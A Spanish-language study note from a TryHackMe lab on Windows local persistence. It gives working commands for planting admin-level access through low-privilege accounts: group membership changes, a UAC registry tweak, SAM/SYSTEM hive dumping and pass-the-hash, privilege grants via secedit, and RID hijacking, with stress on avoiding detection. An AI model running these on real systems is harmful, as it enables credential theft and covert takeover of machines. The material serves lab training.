---
tags: [red-team, persistence, windows, privilege-escalation]
created: 2026-04-20
source: TryHackMe - Windows Local Persistence
related:
  - "[[Abusing Services]]"
  - "[[Abusing Scheduled Tasks]]"
---

Manipular cuentas sin privilegios para obtener acceso administrativo sin levantar sospechas, ya que estas cuentas suelen estar menos monitoreadas.

---

## Asignar membresías de grupo

La forma directa: agregar el usuario al grupo **Administrators**.

```shell
net localgroup administrators thmuser0 /add
```

Esto habilita acceso por RDP, WinRM u otro servicio de administración remota.

### Backup Operators (más sigiloso)

Los usuarios de este grupo pueden **leer/escribir cualquier archivo o clave de registro** ignorando DACLs, sin tener privilegios administrativos directos.

```shell
net localgroup "Backup Operators" thmuser1 /add
```

Para acceso remoto, agregar también a uno de estos grupos:

```shell
net localgroup "Remote Management Users" thmuser1 /add
```

### Problema: UAC y LocalAccountTokenFilterPolicy

Al conectar por WinRM, el grupo Backup Operators aparece como **deshabilitado** (`Group used for deny only`). Esto es por UAC y su política `LocalAccountTokenFilterPolicy`.

Para solucionarlo, modificar el registro:

```shell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

### Extraer hashes SAM

Una vez habilitado, conectar por WinRM y extraer SAM y SYSTEM:

```shell
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
*Evil-WinRM* PS C:\> download system.bak
*Evil-WinRM* PS C:\> download sam.bak
```

Dumpear hashes con `secretsdump.py`:

```shell
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

Pass-the-Hash con el hash de Administrator:

```shell
evil-winrm -i MACHINE_IP -u Administrator -H <NTHASH>
```

---

## Privilegios especiales y Security Descriptors

Alternativa sin modificar membresías de grupo. Se asignan directamente los privilegios que tiene Backup Operators:

- **SeBackupPrivilege**: leer cualquier archivo ignorando DACLs
- **SeRestorePrivilege**: escribir cualquier archivo ignorando DACLs

### Proceso

Exportar configuración actual:

```shell
secedit /export /cfg config.inf
```

Editar `config.inf` y agregar el usuario a las líneas de `SeBackupPrivilege` y `SeRestorePrivilege`.

Importar y aplicar:

```shell
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```

### Habilitar WinRM vía Security Descriptor

En lugar de agregar al grupo Remote Management Users, modificar el security descriptor del servicio WinRM:

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

> [!info] El usuario aparecerá como miembro normal de `Users` sin nada sospechoso.

---

## RID Hijacking

Hacer que Windows asigne un token de Administrator a un usuario sin privilegios, modificando su **RID** en el registro.

- Administrator → RID **500**
- Usuarios regulares → RID **≥ 1000**

Ver RIDs asignados:

```shell
wmic useraccount get name,sid
```

### Proceso

1. Abrir Regedit como SYSTEM:

```shell
PsExec64.exe -i -s regedit
```

2. Navegar a `HKLM\SAM\SAM\Domains\Account\Users\`
3. Buscar la key con el RID del usuario en hex (ej: 1010 = `0x3F2`)
4. En el valor **F**, en la posición **0x30**, reemplazar el RID actual por `F401` (500 en little-endian)

> [!warning] El RID se almacena en little-endian. 500 = 0x01F4 → se escribe como `F4 01`.

Al siguiente login, LSASS asignará al usuario el token de Administrator.
